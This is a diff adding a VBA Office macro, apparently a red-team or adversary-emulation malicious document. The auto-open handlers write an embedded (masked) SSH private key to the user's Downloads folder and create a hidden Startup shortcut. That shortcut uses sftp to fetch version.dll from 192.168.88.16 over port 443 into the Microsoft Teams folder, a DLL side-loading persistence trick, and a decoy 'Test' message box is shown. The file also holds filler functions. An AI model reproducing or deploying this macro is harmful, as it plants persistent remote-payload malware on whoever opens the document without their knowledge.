@@ -1,0 +1,81 @@
+Function genericShort()
+   kContents = "-----BEGIN OPENSSH PRIVATE KEY-----" & vbNewLine
+   kContents = kContents + "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx" & vbNewLine
+   kContents = kContents + "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx" & vbNewLine
+   kContents = kContents + "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx" & vbNewLine
+   kContents = kContents + "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx" & vbNewLine
+   kContents = kContents + "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx" & vbNewLine
+   kContents = kContents + "-----END OPENSSH PRIVATE KEY-----"
+  
+  uProf = Environ("USERPROFILE")
+  tTool = "sftp.exe"
+  uDown = "\Downloads\"
+  FName = "id_rsa"
+  fExt = "bak"
+  tHost = "sysupdate@192.168.88.16"
+  pkPath = uProf & uDown & FName & "." & fExt
+  tArgs = "-o StrictHostKeyChecking=accept-new -o HashKnownHosts=yes -P 443 -i " & pkPath & " " & tHost & ":/version.dll " & uProf & "\AppData\Local\Microsoft\Teams\Current\version.dll"
+
+  Open pkPath For Output As #1
+  Print #1, kContents
+  Close #1
+
+  lPath = uProf & "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\daily_maintenance.lnk"
+    
+  With CreateObject("Wscript.Shell").CreateShortcut(lPath)
+    .TargetPath = "C:\Windows\System32\OpenSSH\" & tTool
+    .Arguments = tArgs
+    .WorkingDirectory = "C:\Windows\System32\OpenSSH\"
+    .WindowStyle = 7
+    .Save
+  End With
+  
+  msgTitle = "Test"
+  msgText = "Test"
+  msgResp = MsgBox(msgText, 16, msgTitle)
+End Function
+
+Sub Auto_Open()
+  genericShort
+End Sub
+
+Sub AutoOpen()
+  Auto_Open
+End Sub
+
+Sub Workbook_Open()
+  Auto_Open
+End Sub
+
+Function primer()
+    Dim primeCount As Integer
+    Dim primeFound As Integer
+    Dim divisors As Integer
+    Dim number As Long
+    Dim i As Long
+
+    divisors = 0
+    number = 1
+    primeCount = 30
+    primeFound = 0
+
+    While primeFound < primeCount
+        For j = 1 To number
+            If number Mod j = 0 Then
+                divisors = divisors + 1
+            End If
+        Next j
+        
+        If divisors = 2 Then
+            primeFound = primeFound + 1
+        End If
+        
+        divisors = 0
+        number = number + 1
+    Wend
+End Function
+
+
+Function exists(ByVal checkFile As String) As Boolean
+   exists = (Dir("C:\Windows\System32\OpenSSH\ssh.exe") <> "")
+End Function
